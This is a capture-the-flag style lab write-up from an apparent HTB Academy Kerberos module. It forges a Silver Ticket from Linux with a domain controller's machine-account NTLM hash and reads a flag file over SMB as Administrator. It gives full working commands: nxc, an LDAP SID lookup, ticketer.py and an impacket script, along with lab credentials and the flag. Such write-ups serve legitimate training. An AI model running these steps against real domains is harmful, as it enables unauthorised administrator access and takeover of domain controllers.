# Silver Ticket from Linux

**Module:** HTB Academy — Kerberos Attacks
**Target:** `ACADEMY-KERBATTCK-2-DC01` (10.129.205.35), domain `INLANEFREIGHT.LOCAL`
**Given access:** `htb-student` / `HTB_@cademy_stdnt!` (domain creds, direct auth to DC01)
**Given:** `DC01$`'s NTLM hash `542780725df68d3456a0672f59001987`
**Goal:** read `C:\Users\Administrator\Videos\silverticket.txt` on DC01

**Result:** `M0rE_S1lV3r_Tickets` — Administrator SMB access on DC01 via a forged Silver Ticket, entirely from Linux, no pivot needed.

---

## 1. Attack chain

1. Confirm creds: `nxc smb 10.129.205.35 -u htb-student -p 'HTB_@cademy_stdnt!'` — domain auth works directly against DC01 itself.
2. Real domain SID via direct LDAP bind to DC01 (same method used in the companion `Golden Ticket from Linux.md` task) — matches the known lab-template SID `S-1-5-21-1870146311-1183348186-593267556`.
3. `ticketer.py -nthash <DC01$ hash> -domain-sid <SID> -domain INLANEFREIGHT.LOCAL -spn cifs/DC01.INLANEFREIGHT.LOCAL Administrator` → forge a Silver Ticket (TGS only, no KDC contact, no krbtgt key needed).
4. Read the flag directly over SMB with `impacket.smbconnection.SMBConnection` + Kerberos login (`remoteName` matching the ccache's exact SPN) + `getFile`.

No blockers this run — DC01 is reachable directly (no internal-only pivot network involved, unlike the companion `Silver Ticket.md` task where the target was SQL01 behind an internal NIC off WS01).

---

## 2. Full command sequence

```bash
# 1. Confirm creds
nxc smb 10.129.205.35 -u htb-student -p 'HTB_@cademy_stdnt!'

# 2. Real domain SID via direct LDAP bind to the DC
python3 -c "
from ldap3 import Server, Connection, NTLM, ALL
s = Server('10.129.205.35', get_info=ALL)
c = Connection(s, user='INLANEFREIGHT\\\\htb-student', password='HTB_@cademy_stdnt!',
               authentication=NTLM, auto_bind=True)
c.search('DC=INLANEFREIGHT,DC=LOCAL', '(sAMAccountName=Administrator)', attributes=['objectSid'])
print(c.entries[0].objectSid)
"
# S-1-5-21-1870146311-1183348186-593267556-500

# 3. Forge the Silver Ticket
ticketer.py -nthash 542780725df68d3456a0672f59001987 \
    -domain-sid S-1-5-21-1870146311-1183348186-593267556 \
    -domain INLANEFREIGHT.LOCAL -spn cifs/DC01.INLANEFREIGHT.LOCAL Administrator
# -> Administrator.ccache

# 4. Use it to read the flag
export KRB5CCNAME="$(pwd)/Administrator.ccache"
python3 - <<'EOF'
from impacket.smbconnection import SMBConnection
import io
conn = SMBConnection(remoteName='DC01.INLANEFREIGHT.LOCAL', remoteHost='10.129.205.35', sess_port=445)
conn.kerberosLogin(user='Administrator', password='', domain='INLANEFREIGHT.LOCAL',
                    useCache=True, kdcHost='10.129.205.35')
buf = io.BytesIO()
conn.getFile('C$', 'Users\\Administrator\\Videos\\silverticket.txt', buf.write)
print(buf.getvalue().decode())
EOF
# M0rE_S1lV3r_Tickets
```

---

## 3. Flag

**`M0rE_S1lV3r_Tickets`**

---

## 4. Key takeaways

- A Silver Ticket targeting `cifs/<DC hostname>` forged with the DC's own machine-account hash gives file-level Administrator access on the DC itself — same mechanic as targeting a member server (`SQL01$` in the companion task), just against the domain controller's own computer account.
- When the given account can reach the DC directly (as here, vs. only having access to a separate workstation on an isolated internal network), the whole chain is four commands: confirm creds, get the SID, forge, read — no pivoting infrastructure needed at all.
- `remoteName` passed to `SMBConnection` must match the ccache's SPN exactly (FQDN here, since `ticketer.py` was given `-spn cifs/DC01.INLANEFREIGHT.LOCAL`) — same lesson as the companion `Silver Ticket.md` task.
